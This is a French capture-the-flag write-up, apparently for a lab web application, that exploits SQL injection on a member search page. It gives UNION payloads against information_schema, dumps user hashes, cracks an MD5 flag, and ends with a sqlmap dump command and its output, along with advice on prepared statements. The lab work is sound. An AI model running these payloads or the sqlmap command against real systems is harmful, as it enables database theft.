# Explications

Sur la page member search, il y a une SQL Injection.

On peut afficher tous les users de la table en recherchant : "1 or 1=1"

On peut imaginer une requete forger comme ca derriere :

```sql
SELECT id, firstname, surname FROM users WHERE id = $_GET['id']
```

en passant une UNION on peut donc lui faire afficher ce qu'on veut.
sur la base de donnée MySQL une database (information_schema) contient des informations cruciales, on peut lui faire afficher les autres db / tables / columns.

```
1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
```

On peut voir une table qui s'appelle "users" avec comme column : "user_id, first_name, last_name, town, country, planet, Commentaire, countersign"

Je vous epargne toutes les requetes essayé mais la plus interessante fut : "1 or 1=1 UNION SELECT Commentaire, countersign FROM users"

on obtient une consigne qui nous invite a :

```
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
5ff9d0165b4f92b14994e5c685cdce28
```

5ff9d0165b4f92b14994e5c685cdce28 (md5->plain text) FortyTwo

fortytwo (ascii->sha256) 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

----

# Cas d'usage

Obtenir un dump de la DB, tous pleins d'infos bien utiles :)

----

# Comment l'eviter ?

Il faut a tout pris passer par des requetes SQL dites prepared, les ORM font tres bien le boulot.
(cf: PDO::prepare)

----

# Good to Know

sqlmap un petit tool en python qui a fait ses preuves depuis, peu permettre de rechercher des SQLi, un petit exemple:

sqlmap -u "http://192.168.2.128/?page=member&id=1&Submit=Submit#" --dump -T users

```
Database: Member_Sql_Injection
Table: users
[4 entries]
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
| user_id | town      | planet | country   | last_name | first_name     | Commentaire                                                                   | countersign                      |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
| 1       | Honolulu  | EARTH  | America   | Obama     | Barack Hussein | Amerca !                                                                      | 2b3366bcfd44f540e630d4dc2b9b06d9 |
| 2       | Berlin    | Earth  | Allemagne | Hitler    | Adolf          | Ich spreche kein Deutsch.                                                     | 60e9032c586fb422e2c16dee6286cf10 |
| 3       | Moscou    | Earth  | Russia    | Staline   | Joseph         | ????? ????????????? ?????????                                                 | e083b24a01c483437bcf4a9eea7c1b4d |
| 5       | 42        | 42     | 42        | GetThe    | Flag           | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
```

Plutot puissant non ?

